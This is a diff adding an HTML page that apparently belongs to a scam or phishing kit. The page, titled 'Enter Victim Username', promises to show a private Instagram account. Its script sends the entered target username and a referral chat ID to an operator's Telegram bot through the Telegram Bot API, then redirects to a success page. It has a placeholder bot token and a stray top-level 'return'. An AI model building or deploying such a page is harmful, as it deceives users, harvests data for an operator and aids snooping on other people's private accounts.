@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Victim Username</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            animation: slideIn 0.5s ease-out;
+            margin: 20px;
+        }
+        h1 {
+            color: #fff;
+            font-size: clamp(1.5rem, 5vw, 2rem);
+            margin-bottom: 15px;
+        }
+        p {
+            color: #fff;
+            font-size: clamp(1rem, 3vw, 1.2rem);
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 25px;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            font-size: clamp(0.9rem, 2.5vw, 1rem);
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(1.05);
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 25px;
+            background: #fff;
+            color: #e6683c;
+            font-size: clamp(0.9rem, 2.5vw, 1rem);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background: #e6683c;
+            color: #fff;
+            transform: translateY(-2px);
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+                border-radius: 15px;
+            }
+            h1 {
+                font-size: clamp(1.2rem, 4vw, 1.8rem);
+            }
+            p {
+                font-size: clamp(0.9rem, 2.5vw, 1rem);
+            }
+            input, button {
+                padding: 10px;
+                font-size: clamp(0.8rem, 2vw, 0.9rem);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Enter Target Username</h1>
+        <p>Provide the Instagram username of the private account you want to view!</p>
+        <form id="victimForm">
+            <input type="text" id="victim_username" placeholder="Target Instagram Username" required>
+            <button type="submit">Submit & View</button>
+        </form>
+    </div>
+    <script>
+        const botToken = 'YOUR_BOT_TOKEN_HERE'; // Replace with your actual bot token
+
+        // Get chat ID from URL parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('ref');
+
+        // Validate chat ID
+        function validateChatId(id) {
+            return /^\d+$/.test(id); // Must be numeric
+        }
+
+        // Instagram username validation
+        function validateInstagramUsername(username) {
+            if (username.includes('@@') || (username.indexOf('@') > 0)) {
+                return { valid: false, cleanUsername: '' };
+            }
+            const cleanUsername = username.startsWith('@') ? username.slice(1) : username;
+            const regex = /^[a-zA-Z0-9._]{1,30}$/;
+            if (cleanUsername.includes(' ') || !regex.test(cleanUsername)) {
+                return { valid: false, cleanUsername };
+            }
+            return { valid: true, cleanUsername };
+        }
+
+        // Check if ref parameter exists
+        if (!chatId || !validateChatId(chatId)) {
+            alert('Invalid or missing ref parameter in URL! Use ?ref=yourChatId');
+            window.location.href = 'index.html';
+            return;
+        }
+
+        document.getElementById('victimForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const victimUsername = document.getElementById('victim_username').value;
+
+            // Validate username
+            const { valid, cleanUsername } = validateInstagramUsername(victimUsername);
+            if (!valid) {
+                alert('Invalid username! Use 1-30 chars (@username, letters, numbers, periods, underscores). No spaces or special chars.');
+                return;
+            }
+
+            // Send to Telegram
+            const message = `🎯 Victim Username: ${cleanUsername}\n🆔 Ref Chat ID: ${chatId}`;
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                const data = await response.json();
+                if (response.ok && data.ok) {
+                    window.location.href = `success.html?ref=${chatId}`;
+                } else {
+                    console.error('Telegram API Error:', data);
+                    alert(`Error sending data: ${data.description || 'Unknown error. Check bot token.'}`);
+                }
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                alert('Error sending data: Network issue or CORS blocked. Check console.');
+            }
+        });
+    </script>
+</body>
+</html>
